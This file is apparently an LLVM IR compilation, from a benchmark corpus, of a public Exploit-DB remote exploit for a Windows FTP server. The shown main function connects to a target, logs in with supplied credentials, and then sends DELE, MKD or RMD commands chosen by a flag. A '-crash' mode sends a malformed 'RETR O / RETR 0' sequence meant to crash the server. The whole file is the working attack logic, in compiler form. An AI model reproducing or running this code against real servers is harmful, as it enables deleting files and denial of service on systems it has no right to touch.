; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_8273.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_8273.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"[+]Connect to Server %s\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [18 x i8] c"[-]FAILED SOCKET\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"USER %s\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [32 x i8] c"[-]Send Request USER\09\09[FAILED]\0A\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"PASS %s\0D\0A\00", align 1
@.str.5 = private unnamed_addr constant [32 x i8] c"[-]Send Request PASS\09\09[FAILED]\0A\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"[+]>>%s\00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c"SYST\0D\0A\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"-df\00", align 1
@.str.9 = private unnamed_addr constant [10 x i8] c"DELE %s\0D\0A\00", align 1
@.str.10 = private unnamed_addr constant [32 x i8] c"[-]Send Request DELE\09\09[FAILED]\0A\00", align 1
@.str.11 = private unnamed_addr constant [4 x i8] c"-cd\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"MKD %s\0D\0A\00", align 1
@.str.13 = private unnamed_addr constant [31 x i8] c"[-]Send Request MKD\09\09[FAILED]\0A\00", align 1
@.str.14 = private unnamed_addr constant [4 x i8] c"-dd\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"RMD %s\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [31 x i8] c"[-]Send Request RMD\09\09[FAILED]\0A\00", align 1
@.str.17 = private unnamed_addr constant [7 x i8] c"-crash\00", align 1
@.str.18 = private unnamed_addr constant [17 x i8] c"RETR O\0D\0ARETR 0\0D\0A\00", align 1
@.str.19 = private unnamed_addr constant [32 x i8] c"[-]Send Request RETR\09\09[FAILED]\0A\00", align 1
@.str.20 = private unnamed_addr constant [22 x i8] c"[-]Connect\09\09[FAILED]\0A\00", align 1
@.str.21 = private unnamed_addr constant [10 x i8] c"[+]Done!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca [50 x i8], align 16
  %13 = alloca [100 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* %4, align 4
  %15 = icmp slt i32 %14, 6
  br i1 %15, label %16, label %21

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 @syntax(i8* %19)
  br label %21

21:                                               ; preds = %16, %2
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 2
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 @atoi(i8* %24)
  store i32 %25, i32* %6, align 4
  store i32 12, i32* %10, align 4
  %26 = load i32, i32* @AF_INET, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %26, i32* %27, align 4
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @inet_addr(i8* %30)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %33 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %32, i32 0, i32 0
  store i32 %31, i32* %33, align 4
  %34 = load i32, i32* %6, align 4
  %35 = call i32 @htons(i32 %34)
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i32 %35, i32* %36, align 4
  %37 = load i32, i32* @stdout, align 4
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 (i32, i8*, ...) @fprintf(i32 %37, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0), i8* %40)
  %42 = load i32, i32* @AF_INET, align 4
  %43 = load i32, i32* @SOCK_STREAM, align 4
  %44 = call i32 @socket(i32 %42, i32 %43, i32 0)
  store i32 %44, i32* %8, align 4
  %45 = load i32, i32* %8, align 4
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %50

47:                                               ; preds = %21
  %48 = load i32, i32* @stderr, align 4
  %49 = call i32 (i32, i8*, ...) @fprintf(i32 %48, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  br label %263

50:                                               ; preds = %21
  %51 = load i32, i32* %8, align 4
  %52 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @connect(i32 %51, %struct.sockaddr* %52, i32 %53)
  store i32 %54, i32* %9, align 4
  %55 = load i32, i32* %9, align 4
  %56 = icmp ne i32 %55, -1
  br i1 %56, label %57, label %250

57:                                               ; preds = %50
  %58 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 3
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 (i8*, i8*, ...) @sprintf(i8* %58, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i8* %61)
  %63 = load i32, i32* %8, align 4
  %64 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %65 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %66 = call i32 @strlen(i8* %65)
  %67 = call i32 @send(i32 %63, i8* %64, i32 %66, i32 0)
  %68 = icmp eq i32 %67, -1
  br i1 %68, label %69, label %74

69:                                               ; preds = %57
  %70 = load i32, i32* @stderr, align 4
  %71 = call i32 (i32, i8*, ...) @fprintf(i32 %70, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0))
  %72 = load i32, i32* %8, align 4
  %73 = call i32 @shutdown(i32 %72, i32 1)
  store i32 1, i32* %3, align 4
  br label %263

74:                                               ; preds = %57
  %75 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %76 = call i32 @memset(i8* %75, i32 0, i32 100)
  %77 = load i32, i32* %8, align 4
  %78 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %79 = call i32 @recv(i32 %77, i8* %78, i32 100, i32 0)
  br label %80

80:                                               ; preds = %74
  %81 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %82 = load i8**, i8*** %5, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 4
  %84 = load i8*, i8** %83, align 8
  %85 = call i32 (i8*, i8*, ...) @sprintf(i8* %81, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0), i8* %84)
  %86 = load i32, i32* %8, align 4
  %87 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %88 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %89 = call i32 @strlen(i8* %88)
  %90 = call i32 @send(i32 %86, i8* %87, i32 %89, i32 0)
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %97

92:                                               ; preds = %80
  %93 = load i32, i32* @stderr, align 4
  %94 = call i32 (i32, i8*, ...) @fprintf(i32 %93, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.5, i64 0, i64 0))
  %95 = load i32, i32* %8, align 4
  %96 = call i32 @shutdown(i32 %95, i32 1)
  store i32 1, i32* %3, align 4
  br label %263

97:                                               ; preds = %80
  %98 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %99 = call i32 @memset(i8* %98, i32 0, i32 100)
  %100 = load i32, i32* %8, align 4
  %101 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %102 = call i32 @recv(i32 %100, i8* %101, i32 100, i32 0)
  %103 = load i32, i32* @stdout, align 4
  %104 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %105 = call i32 (i32, i8*, ...) @fprintf(i32 %103, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0), i8* %104)
  br label %106

106:                                              ; preds = %97
  %107 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %108 = call i32 (i8*, i8*, ...) @sprintf(i8* %107, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0))
  %109 = load i32, i32* %8, align 4
  %110 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %111 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %112 = call i32 @strlen(i8* %111)
  %113 = call i32 @send(i32 %109, i8* %110, i32 %112, i32 0)
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %120

115:                                              ; preds = %106
  %116 = load i32, i32* @stderr, align 4
  %117 = call i32 (i32, i8*, ...) @fprintf(i32 %116, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.5, i64 0, i64 0))
  %118 = load i32, i32* %8, align 4
  %119 = call i32 @shutdown(i32 %118, i32 1)
  store i32 1, i32* %3, align 4
  br label %263

120:                                              ; preds = %106
  %121 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %122 = call i32 @memset(i8* %121, i32 0, i32 100)
  %123 = load i32, i32* %8, align 4
  %124 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %125 = call i32 @recv(i32 %123, i8* %124, i32 100, i32 0)
  %126 = load i32, i32* @stdout, align 4
  %127 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %128 = call i32 (i32, i8*, ...) @fprintf(i32 %126, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0), i8* %127)
  br label %129

129:                                              ; preds = %120
  %130 = load i8**, i8*** %5, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 5
  %132 = load i8*, i8** %131, align 8
  %133 = call i32 @strcmp(i8* %132, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0))
  %134 = icmp ne i32 %133, 0
  br i1 %134, label %162, label %135

135:                                              ; preds = %129
  %136 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %137 = load i8**, i8*** %5, align 8
  %138 = getelementptr inbounds i8*, i8** %137, i64 6
  %139 = load i8*, i8** %138, align 8
  %140 = call i32 (i8*, i8*, ...) @sprintf(i8* %136, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.9, i64 0, i64 0), i8* %139)
  %141 = load i32, i32* %8, align 4
  %142 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %143 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %144 = call i32 @strlen(i8* %143)
  %145 = call i32 @send(i32 %141, i8* %142, i32 %144, i32 0)
  %146 = icmp eq i32 %145, -1
  br i1 %146, label %147, label %152

147:                                              ; preds = %135
  %148 = load i32, i32* @stderr, align 4
  %149 = call i32 (i32, i8*, ...) @fprintf(i32 %148, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.10, i64 0, i64 0))
  %150 = load i32, i32* %8, align 4
  %151 = call i32 @shutdown(i32 %150, i32 1)
  store i32 1, i32* %3, align 4
  br label %263

152:                                              ; preds = %135
  %153 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %154 = call i32 @memset(i8* %153, i32 0, i32 100)
  %155 = load i32, i32* %8, align 4
  %156 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %157 = call i32 @recv(i32 %155, i8* %156, i32 100, i32 0)
  %158 = load i32, i32* @stdout, align 4
  %159 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %160 = call i32 (i32, i8*, ...) @fprintf(i32 %158, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0), i8* %159)
  br label %161

161:                                              ; preds = %152
  br label %162

162:                                              ; preds = %161, %129
  %163 = load i8**, i8*** %5, align 8
  %164 = getelementptr inbounds i8*, i8** %163, i64 5
  %165 = load i8*, i8** %164, align 8
  %166 = call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.11, i64 0, i64 0))
  %167 = icmp ne i32 %166, 0
  br i1 %167, label %195, label %168

168:                                              ; preds = %162
  %169 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %170 = load i8**, i8*** %5, align 8
  %171 = getelementptr inbounds i8*, i8** %170, i64 6
  %172 = load i8*, i8** %171, align 8
  %173 = call i32 (i8*, i8*, ...) @sprintf(i8* %169, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i64 0, i64 0), i8* %172)
  %174 = load i32, i32* %8, align 4
  %175 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %176 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %177 = call i32 @strlen(i8* %176)
  %178 = call i32 @send(i32 %174, i8* %175, i32 %177, i32 0)
  %179 = icmp eq i32 %178, -1
  br i1 %179, label %180, label %185

180:                                              ; preds = %168
  %181 = load i32, i32* @stderr, align 4
  %182 = call i32 (i32, i8*, ...) @fprintf(i32 %181, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.13, i64 0, i64 0))
  %183 = load i32, i32* %8, align 4
  %184 = call i32 @shutdown(i32 %183, i32 1)
  store i32 1, i32* %3, align 4
  br label %263

185:                                              ; preds = %168
  %186 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %187 = call i32 @memset(i8* %186, i32 0, i32 100)
  %188 = load i32, i32* %8, align 4
  %189 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %190 = call i32 @recv(i32 %188, i8* %189, i32 100, i32 0)
  %191 = load i32, i32* @stdout, align 4
  %192 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %193 = call i32 (i32, i8*, ...) @fprintf(i32 %191, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0), i8* %192)
  br label %194

194:                                              ; preds = %185
  br label %195

195:                                              ; preds = %194, %162
  %196 = load i8**, i8*** %5, align 8
  %197 = getelementptr inbounds i8*, i8** %196, i64 5
  %198 = load i8*, i8** %197, align 8
  %199 = call i32 @strcmp(i8* %198, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.14, i64 0, i64 0))
  %200 = icmp ne i32 %199, 0
  br i1 %200, label %228, label %201

201:                                              ; preds = %195
  %202 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %203 = load i8**, i8*** %5, align 8
  %204 = getelementptr inbounds i8*, i8** %203, i64 6
  %205 = load i8*, i8** %204, align 8
  %206 = call i32 (i8*, i8*, ...) @sprintf(i8* %202, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i64 0, i64 0), i8* %205)
  %207 = load i32, i32* %8, align 4
  %208 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %209 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %210 = call i32 @strlen(i8* %209)
  %211 = call i32 @send(i32 %207, i8* %208, i32 %210, i32 0)
  %212 = icmp eq i32 %211, -1
  br i1 %212, label %213, label %218

213:                                              ; preds = %201
  %214 = load i32, i32* @stderr, align 4
  %215 = call i32 (i32, i8*, ...) @fprintf(i32 %214, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.16, i64 0, i64 0))
  %216 = load i32, i32* %8, align 4
  %217 = call i32 @shutdown(i32 %216, i32 1)
  store i32 1, i32* %3, align 4
  br label %263

218:                                              ; preds = %201
  %219 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %220 = call i32 @memset(i8* %219, i32 0, i32 100)
  %221 = load i32, i32* %8, align 4
  %222 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %223 = call i32 @recv(i32 %221, i8* %222, i32 100, i32 0)
  %224 = load i32, i32* @stdout, align 4
  %225 = getelementptr inbounds [100 x i8], [100 x i8]* %13, i64 0, i64 0
  %226 = call i32 (i32, i8*, ...) @fprintf(i32 %224, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0), i8* %225)
  br label %227

227:                                              ; preds = %218
  br label %228

228:                                              ; preds = %227, %195
  %229 = load i8**, i8*** %5, align 8
  %230 = getelementptr inbounds i8*, i8** %229, i64 5
  %231 = load i8*, i8** %230, align 8
  %232 = call i32 @strcmp(i8* %231, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i64 0, i64 0))
  %233 = icmp ne i32 %232, 0
  br i1 %233, label %249, label %234

234:                                              ; preds = %228
  %235 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %236 = call i32 (i8*, i8*, ...) @sprintf(i8* %235, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.18, i64 0, i64 0))
  %237 = load i32, i32* %8, align 4
  %238 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %239 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %240 = call i32 @strlen(i8* %239)
  %241 = call i32 @send(i32 %237, i8* %238, i32 %240, i32 0)
  %242 = icmp eq i32 %241, -1
  br i1 %242, label %243, label %248

243:                                              ; preds = %234
  %244 = load i32, i32* @stderr, align 4
  %245 = call i32 (i32, i8*, ...) @fprintf(i32 %244, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.19, i64 0, i64 0))
  %246 = load i32, i32* %8, align 4
  %247 = call i32 @shutdown(i32 %246, i32 1)
  store i32 1, i32* %3, align 4
  br label %263

248:                                              ; preds = %234
  br label %249

249:                                              ; preds = %248, %228
  br label %255

250:                                              ; preds = %50
  %251 = load i32, i32* @stderr, align 4
  %252 = call i32 (i32, i8*, ...) @fprintf(i32 %251, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.20, i64 0, i64 0))
  %253 = load i32, i32* %8, align 4
  %254 = call i32 @shutdown(i32 %253, i32 1)
  store i32 1, i32* %3, align 4
  br label %263

255:                                              ; preds = %249
  %256 = load i32, i32* %8, align 4
  %257 = call i32 @shutdown(i32 %256, i32 1)
  %258 = load i32, i32* @stdout, align 4
  %259 = load i8**, i8*** %5, align 8
  %260 = getelementptr inbounds i8*, i8** %259, i64 5
  %261 = load i8*, i8** %260, align 8
  %262 = call i32 (i32, i8*, ...) @fprintf(i32 %258, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.21, i64 0, i64 0), i8* %261)
  store i32 0, i32* %3, align 4
  br label %263

263:                                              ; preds = %255, %250, %243, %213, %180, %147, %115, %92, %69, %47
  %264 = load i32, i32* %3, align 4
  ret i32 %264
}

declare dso_local i32 @syntax(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @shutdown(i32, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @strcmp(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
